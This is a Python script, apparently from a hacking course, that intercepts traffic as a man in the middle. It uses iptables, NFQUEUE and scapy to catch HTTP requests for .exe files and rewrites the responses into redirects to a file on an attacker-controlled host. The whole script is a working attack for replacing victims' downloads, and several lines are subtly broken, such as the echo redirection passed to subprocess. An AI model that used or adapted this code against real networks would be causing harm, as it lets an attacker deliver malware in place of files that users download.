#!usr/bin/env python

# echo 1 > /proc/sys/net/ipv4/ip_forward
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# Only for python <2.7

import netfilterqueue
import scapy.all as scapy
import subprocess

# Set new load to caught packet


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# Change load from caught packet ,only for http


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        if scapy_packet[scapy.TCP].dport == 10000:
            if ".exe" in scapy_packet[scapy.Raw].load and "my server ip" not in scapy_packet[scapy.Raw].load:
                print("[+] .exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 10000 or scapy_packet[scapy.TCP].sport == "http":
            print("[+] HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                load = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.148.188/files/file.txt\n\n"
                mod_packet = set_load(scapy_packet, load)
                packet.set_payload(str(mod_packet))
    packet.accept()


ack_list = []
file_way = " "
subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num 0"])
subprocess.call(["iptables", "-t", "nat", "-A",
                 "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j",
                 "REDIRECT", "--to-port", "10000"])
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call(["iptables", "--flush"])
    print("[+] Detected Ctrl+C ... Quitting")
